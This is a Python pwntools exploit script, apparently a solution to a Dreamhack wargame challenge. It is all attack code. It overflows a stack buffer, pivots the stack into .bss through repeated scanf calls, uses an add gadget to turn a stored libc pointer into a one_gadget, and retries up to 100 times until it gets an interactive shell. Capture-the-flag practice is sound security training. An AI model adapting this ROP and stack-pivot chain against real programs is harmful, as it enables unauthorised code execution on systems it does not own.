from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 20735

main = 0x401136
ret = 0x40101a
leave = 0x401168
bss = 0x404500
pop_rbp = 0x40111d
scanf = 0x401145

'0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret'
important_libc_address = 0x404508
add = 0x40111c
pop_rbx = 0x8009c
one_gadget = 0xebd52
delta = one_gadget - pop_rbx

for i in range(100):
    r = remote(HOST, PORT)
    try:
        payload = flat([
            b'A'*0x100,
            0,
            pop_rbp,
            0x404d00,
            scanf
        ])
        r.sendline(payload)
        time.sleep(0.08)

        payload = flat([
            b'B'*0x100,
            0,
            pop_rbp,
            0x404f00,
            scanf
        ])
        r.sendline(payload)
        time.sleep(0.08)

        payload = flat([
            b'C'*0x100, # 0x404e00
            0x404610,   # 0x404f00
            scanf,
            0x404600,
            scanf
        ])
        r.sendline(payload)
        time.sleep(0.08)

        payload = flat([
            delta, # 0x404510
            0x404508+0x3d,
            0,0,0,0,
            add,
            pop_rbp,
            0x404500,
            leave
        ])
        payload = payload.ljust(0xf0, b'D') + flat([
            0x404500,
            leave,
            0x404f10,
            leave
        ])
        r.sendline(payload)
        time.sleep(0.08)

        payload = flat([
            0x404500,
            b'\x9c'
        ])
        r.sendline(payload)
        time.sleep(0.08)
        
        r.sendline(b'echo shell')
        res = r.recvline(timeout=3)
        if b'shell' in res:
            print("SHELL")
            r.interactive()
    except EOFError:
        pass
    finally:
        r.close()